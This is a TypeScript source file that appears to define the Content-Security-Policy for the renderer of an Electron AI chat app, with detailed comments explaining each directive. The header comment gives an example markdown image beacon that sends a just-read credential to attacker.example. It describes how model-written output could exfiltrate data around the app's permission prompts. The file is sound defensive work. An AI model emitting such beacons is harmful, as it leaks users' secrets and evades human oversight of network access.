import { THEME_SCHEME } from './themes/css'

/**
 * The renderer's Content-Security-Policy (071, from 069 finding 2).
 *
 * **What there was before this file: nothing.** No `<meta http-equiv>`, no `onHeadersReceived` — the
 * only two mentions of CSP in the tree were comments anticipating one. And `html: false` does not
 * disable `![](…)`: markdown-it's own image rule emits an `<img src>` and its `validateLink`
 * explicitly permits `https:`, so a model writing
 *
 *     ![](https://attacker.example/p.png?d=<the credential it just read>)
 *
 * into its own reply had the browser fetch that URL the moment the reply rendered. No tool call, no
 * permission card, no click, and no record in the transcript that a network request happened —
 * around the very gate this app builds its permission UI on, since `WebFetch`/`WebSearch` are
 * deliberately outside the exempt list precisely so egress prompts.
 *
 * It re-fires on read, too: replaying an archived conversation re-renders the same markdown.
 *
 * **This is the browser's half of the fix and it is the second half.** The first is `markdown.ts`,
 * which no longer emits an `<img>` for a destination that could reach the network at all. Two
 * mechanisms for one hazard on purpose: a CSP is enforced by the document, so it is only as good as
 * every future window and every future scheme remembering to carry it, and a renderer that never
 * writes the element is a fact about our own output. Either alone would close the beacon today.
 */

/** The scheme the app serves its own generated images on (067). */
const ASSET_SCHEME = 'brobot-asset:'

/**
 * The policy, as directives.
 *
 * `default-src 'none'` is the load-bearing line: every fetch directive that is not named below
 * inherits it, so a capability nobody thought about — `media-src`, `worker-src`, `manifest-src`,
 * `prefetch-src` — is denied by having been forgotten rather than permitted by it.
 *
 * Directive by directive, and why each is as wide as it is and no wider:
 *
 *  - **`img-src 'self' brobot-asset: data: blob:`** — no `https:`, which is the finding.
 *    `brobot-asset:` is the app's own scheme and its privileges deliberately leave `bypassCSP: false`
 *    (`asset-protocol.ts`), whose comment says exactly why: *"an exemption would make it the one way
 *    to load anything if a CSP is ever added"*. This is that CSP, and the scheme is subject to it.
 *    `data:` is inert — no request leaves the machine — and markdown-it already refuses
 *    `data:image/svg+xml`, so no scriptable image can arrive through it. ⚑ **D-032 · `blob:`** is
 *    a kept PNG, JPEG, GIF or WebP, handed over by main and wrapped by this document itself: a blob
 *    URL is minted only by the document that holds it, so nothing reaches the network through it.
 *    ⚑ A kept SVG is drawn from a `data:` URL instead, never a `blob:` — so no blob this window
 *    holds can run script in its origin, even framed, and `frame-src` refuses every `data:` URL. ⛔ Only
 *    `img-src`: `script-src` still names `'self'` alone, so no script runs from a `blob:` or a
 *    `data:` URL.
 *  - **`script-src 'self'`** — the bundle, and nothing inline. There is no `<script>` in any
 *    rendered markdown to begin with (`html: false` escapes it), so this is the backstop for the
 *    day something else injects. ⚠️ **D-032 · and not more than that**: on the packaged `file:`
 *    origin `'self'` admits a script from any local file — measured on Electron 43.2.0, a page
 *    framed as a `blob:` by mistake ran one.
 *  - **`style-src 'self' 'unsafe-inline'`** — Vue injects component styles as `<style>` elements at
 *    runtime and `index.html` carries an inline `<style>` for the pre-mount background. Both are
 *    ours; neither is model-authored. Dropping `'unsafe-inline'` would need a nonce plumbed through
 *    Vue's style injection, which buys nothing here — CSS is not the exfiltration channel this
 *    policy is about, and `img-src` already refuses the one that is.
 *  - **`connect-src 'self'`** — the renderer talks to the main process over IPC, which is not a
 *    network request at all. In a packaged build nothing here should ever open a socket.
 *  - **`font-src 'self'`** — system fonts by name need no request; this permits a bundled one and
 *    refuses a remote.
 *  - **`frame-src blob:` / `object-src 'none'`** — an `<iframe>` or `<object>` is a document with
 *    its own policy, and the preload is exposed on purpose (`window-navigation.ts`). ⚑ **D-032 ·
 *    `blob:` and nothing else**, for one frame: a kept PDF, drawn by Chromium's own viewer from bytes
 *    main typed by their `%PDF-`. The viewer cannot be sandboxed (measured on Electron 43.2.0), so
 *    what holds that frame is what may load in it: the navigation guard admits only a `blob:` the
 *    app's document minted and the viewer's own pages under it (`permitsSubframe`), and the window
 *    frames only a PDF. ⚠️ A `blob:` document inherits this policy, which runs no inline script, but
 *    `'self'` on a `file:` origin admits any local script file — measured, a page framed as a `blob:`
 *    by mistake ran one — so this line is not what keeps a page out of that frame.
 *  - **`base-uri 'none'`** — a `<base>` element would re-point every relative URL in the document
 *    at once. Nothing here writes one.
 *  - **`form-action 'none'`** — a form POST is an egress channel that `connect-src` does not cover.
 *    The app has no forms.
 *
 * ⚠️ **`frame-ancestors` is deliberately absent**: it is meaningless in a `<meta>` policy (the spec
 * says user agents must ignore it there), and a directive that is silently dropped in one of the two
 * places this policy is delivered would be worse than no directive at all.
 */
function directives(devOrigins: readonly string[]): [string, string[]][] {
  return [
    ['default-src', [`'none'`]],
    ['script-src', [`'self'`]],
    ['style-src', [`'self'`, `'unsafe-inline'`]],
    ['img-src', [`'self'`, ASSET_SCHEME, `${THEME_SCHEME}:`, 'data:', 'blob:']],
    ['font-src', [`'self'`, `${THEME_SCHEME}:`]],
    ['connect-src', [`'self'`, ...devOrigins]],
    ['frame-src', ['blob:']],
    ['object-src', [`'none'`]],
    ['base-uri', [`'none'`]],
    ['form-action', [`'none'`]],
  ]
}

/**
 * The dev server's own origins, which exist ONLY while a dev server does.
 *
 * Vite's HMR client opens a WebSocket, and this repo puts it on a second port (24679, see
 * `electron.vite.config.ts`) that the main process has no reason to know. A port wildcard rather
 * than that number, so the two files cannot drift into a broken-HMR-only-in-dev bug; `localhost`
 * rather than a wildcard host, so this is still a policy.
 *
 * `'self'` already covers the document's own origin, so this adds only what `'self'` does not: the
 * websocket scheme, and the second port.
 */
const DEV_ORIGINS = ['ws://localhost:*', 'http://localhost:*'] as const

/**
 * The policy string.
 *
 * @param dev whether a dev server is serving the document — the ONE difference between the two
 *   builds, and it is additive: nothing the packaged policy refuses becomes permitted, the dev
 *   server's own websocket simply becomes reachable.
 */
export function rendererCsp(dev = false): string {
  return directives(dev ? DEV_ORIGINS : [])
    .map(([name, values]) => `${name} ${values.join(' ')}`)
    .join('; ')
}

/** The header name, spelled once. */
export const CSP_HEADER = 'Content-Security-Policy'

/**
 * The `<meta>` element the PACKAGED document carries, as a Vite tag descriptor.
 *
 * Injected at build rather than written into `index.html`, because the same file is what the dev
 * server serves and a document carrying both a meta policy and a header policy is held to the
 * INTERSECTION of the two — so a static tag would make the dev relaxation unreachable and break HMR
 * for everyone. Build-only, and dev gets its policy from the header instead.
 *
 * ⚠️ **Why a meta tag exists at all when the header is installed for every session** — and this is
 * measured rather than assumed, because the assumption was wrong. The packaged renderer is loaded
 * with `loadFile`, i.e. a `file://` URL, and the received wisdom is that those bypass `webRequest`
 * (which is Chromium's network stack). On **Electron 43.2.0 they do not**: loading the built
 * document over `file://` with only the header installed still raised a `securitypolicyviolation`
 * for a remote `<img>`, and stripping the header stopped it. So the header alone would do.
 *
 * The tag stays because that is a Chromium behaviour nobody here controls, on the one build a user
 * runs. The two deliveries carry the SAME string — both call {@link rendererCsp} — so there is no
 * intersection to reason about and no way for them to disagree; the cost of the second one is a
 * meta element, and what it buys is that the packaged policy does not depend on a measurement that
 * could change under an Electron upgrade.
 *
 * ⚠️ It is injected `head-prepend`, ahead of `<meta charset>`, deliberately: a meta policy governs
 * only what follows it. The charset declaration is still inside the first 1024 bytes, which is the
 * requirement that actually applies to it.
 */
export function cspMetaTag(): {
  tag: 'meta'
  attrs: Record<string, string>
  injectTo: 'head-prepend'
} {
  return {
    tag: 'meta',
    attrs: { 'http-equiv': CSP_HEADER, content: rendererCsp(false) },
    injectTo: 'head-prepend',
  }
}

/**
 * 🔴 **D-032 · the PDF viewer Chromium ships, by its own origin** — its extension's id is a constant
 * in Chromium (`kPdfExtensionId`), the same in every build of this Electron. Read by the header below
 * and by the navigation guard (`window-navigation.ts`).
 */
export const PDF_VIEWER_ORIGIN = 'chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai'

/** The sliver of Electron's `webRequest` this needs, so the wiring is testable without an app. */
export interface HeaderReceiver {
  onHeadersReceived(
    listener: (
      details: { url?: string; responseHeaders?: Record<string, string | string[]> },
      callback: (response: { responseHeaders?: Record<string, string | string[]> }) => void,
    ) => void,
  ): void
}

/**
 * Put the policy on every response this session serves.
 *
 * **Replaces rather than merges.** A response arriving with its own `Content-Security-Policy` would
 * otherwise be intersected with ours, which sounds safe and is not: the resulting policy is
 * whichever of the two a document happens to receive, and this app has exactly one document whose
 * policy is a decision, not a negotiation. The existing header is dropped in the same pass that
 * drops its case variants — Chromium sends header names in any case, and a `content-security-policy`
 * left beside a `Content-Security-Policy` would be a second policy hiding behind a capital letter.
 *
 * ⛔ **D-032 · except the PDF viewer's own pages, which keep Chromium's policy.** This header reaches
 * them too, and measured on Electron 43.2.0 it broke the viewer: under this app's policy its own
 * scripts and stylesheet from `chrome://resources` were never fetched, and the PDF's own frame never
 * loaded. ⚑ Its pages keep the policy Chromium wrote for them, and none of them is this app's
 * document.
 */
export function installCspHeaders(receiver: HeaderReceiver, policy: string): void {
  receiver.onHeadersReceived((details, callback) => {
    if (details.url?.startsWith(`${PDF_VIEWER_ORIGIN}/`) === true) {
      callback({})
      return
    }
    const headers: Record<string, string | string[]> = {}
    for (const [name, value] of Object.entries(details.responseHeaders ?? {})) {
      if (name.toLowerCase() !== CSP_HEADER.toLowerCase()) headers[name] = value
    }
    headers[CSP_HEADER] = [policy]
    callback({ responseHeaders: headers })
  })
}
